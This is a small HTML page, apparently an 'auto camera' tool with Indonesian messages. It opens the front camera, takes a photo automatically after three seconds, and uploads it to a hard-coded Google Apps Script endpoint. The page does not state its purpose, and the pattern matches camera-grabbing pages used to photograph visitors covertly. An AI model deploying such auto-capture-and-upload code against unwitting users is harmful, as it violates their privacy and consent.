<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Auto Camera</title>
</head>
<body>

<video id="video" autoplay playsinline style="width:100%;max-width:400px;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>

const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyDcJPqlwfkGxPBLcAd-0bMFpj9m4FeEWFetBpyl5g3K7wF4SU1HQzM3cCUWUh_JI1rcQ/exec";

window.onload = async function () {

  try {

    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user"
      }
    });

    const video = document.getElementById("video");
    video.srcObject = stream;

    video.onloadedmetadata = function () {

      setTimeout(async () => {

        try {

          const canvas = document.getElementById("canvas");

          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0);

          const image = canvas.toDataURL("image/jpeg", 0.9);

          console.log("Foto berhasil dibuat");
          console.log(image.substring(0, 50));

          const response = await fetch(WEBAPP_URL, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              image: image
            })
          });

          const result = await response.text();

          console.log("Response Apps Script:", result);

          alert("Foto berhasil disimpan");

          stream.getTracks().forEach(track => track.stop());

        } catch (err) {

          console.error(err);
          alert("Gagal upload: " + err.message);

        }

      }, 3000);

    };

  } catch (err) {

    console.error(err);
    alert("Error Kamera: " + err.message);

  }

};

</script>

</body>
</html>
